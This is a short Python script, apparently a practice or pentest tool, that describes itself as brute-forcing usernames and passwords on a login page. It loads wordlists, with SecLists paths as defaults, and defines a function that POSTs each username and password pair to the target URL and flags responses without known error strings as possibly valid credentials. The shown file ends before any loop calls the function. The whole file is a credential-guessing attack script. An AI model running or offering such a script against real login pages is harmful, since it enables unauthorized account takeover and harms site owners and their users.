import sys
import requests

print("This script is used to brute force usernames and Passwords on a login page.")
#ASCII ART

Website = sys.argv[1]
try:
    Password_file = sys.argv[2]
except IndexError:
    print("Usage: python bruteforce.py <website> <password_file> <username_file>")
    Password_file = "/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt"
try:
    Username_file = sys.argv[3]
except IndexError:
    print("Usage: python bruteforce.py <website> <password_file> <username_file>")
    Username_file = "/usr/share/seclists/Usernames/Names/names.txt"
try:
    with open(Password_file, "r") as pass_file:
        passwords = [line.strip() for line in pass_file if line.strip()]
except FileNotFoundError:
    print(f"Error: The file {Password_file} does not exist.")
    sys.exit(1)
    
try:
    with open(Username_file, "r") as user_file:
        usernames = [line.strip() for line in user_file if line.strip()]
except FileNotFoundError:
    print(f"Error: The file {Username_file} does not exist.")
    sys.exit(1)

#usernames for users
#passwords for passwords
#Website for the login page URL
def try_login(website, username, password):

    data = {
                "username": username,
                "password": password
            }   
    response = requests.post(website, data=data)
    if "Wrong password" in response.text:
        print(f"Username: {username} | Password: {password} - Wrong password")
    elif "wrong username" in response.text:
        print(f"Username: {username} - Wrong username")
    else:
        print(f"Username: {username} | Password: {password} - Possibly valid credentials")
  
